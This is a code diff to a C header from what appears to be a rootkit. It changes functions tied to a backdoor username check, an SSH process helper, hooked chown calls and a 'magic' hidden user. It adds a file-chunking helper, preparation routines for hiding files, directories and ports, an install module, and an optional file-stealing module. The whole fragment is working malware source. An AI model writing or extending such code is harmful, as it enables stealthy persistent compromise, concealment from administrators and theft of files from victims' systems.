@@ -34,7 +34,20 @@ int bd_sshproc(void);
 
 #define isbduname(name) !strncmp(BD_UNAME, name, strlen(BD_UNAME))
 
-int chown_path(char *path, gid_t gid){
+#define MAGICUSR 0
+#define NORMLUSR 1
+
+off_t getablocksize(off_t fsize){
+    int count = BLOCKS_COUNT;
+    off_t blksize = fsize/count;
+#ifdef MAX_BLOCK_SIZE
+    while(blksize > MAX_BLOCK_SIZE)
+        blksize = fsize/count++;
+#endif
+    return blksize;
+}
+
+int chown_path(const char *path, gid_t gid){
     hook(CCHOWN);
     return (long)call(CCHOWN, path, 0, gid);
 }
@@ -93,8 +106,19 @@ int rknomore(void);
 
 #include "magic/magic.h"
 
+int prepareregfile(const char *path, gid_t magicgid);
+int preparedir(const char *path, gid_t magicgid);
+#ifdef HIDE_PORTS
+void prepareports(void);
+#endif
+#include "prep.c"
+
+#include "install/install.h"
+
+
 #ifdef FILE_STEAL
 #include "steal/steal.h"
 #endif
+
 
 #endif
